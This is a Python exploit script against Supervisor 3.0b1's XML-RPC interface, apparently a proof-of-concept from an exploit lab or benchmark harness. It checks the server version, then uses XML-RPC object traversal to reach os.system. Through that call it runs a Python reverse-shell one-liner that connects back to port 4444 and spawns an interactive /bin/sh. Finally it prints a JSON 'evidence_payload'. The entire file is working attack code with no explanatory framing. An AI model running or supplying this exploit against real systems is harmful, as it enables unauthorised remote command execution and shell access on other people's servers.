#!/usr/bin/env python3
"""Use Supervisor XML-RPC object traversal to launch a shell."""

import json
import os
import xmlrpc.client


METHOD = "supervisor.supervisord.options.warnings.linecache.os.system"


def shell_command() -> str:
    code = (
        'import os,socket;'
        's=socket.create_connection(("127.0.0.1",4444));'
        '[os.dup2(s.fileno(),fd) for fd in (0,1,2)];'
        'os.execl("/bin/sh","sh","-i")'
    )
    return "python -c '" + code + "'"


def main() -> None:
    base_url = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    with xmlrpc.client.ServerProxy(base_url + "/RPC2") as proxy:
        version = proxy.supervisor.getSupervisorVersion()
        if version != "3.0b1":
            raise RuntimeError(f"Unexpected Supervisor version {version}")
        result = getattr(proxy, METHOD)(shell_command())
    print(json.dumps({"evidence_payload": {
        "xmlrpc_method": METHOD,
        "command_exit_code": result,
    }}))


if __name__ == "__main__":
    main()
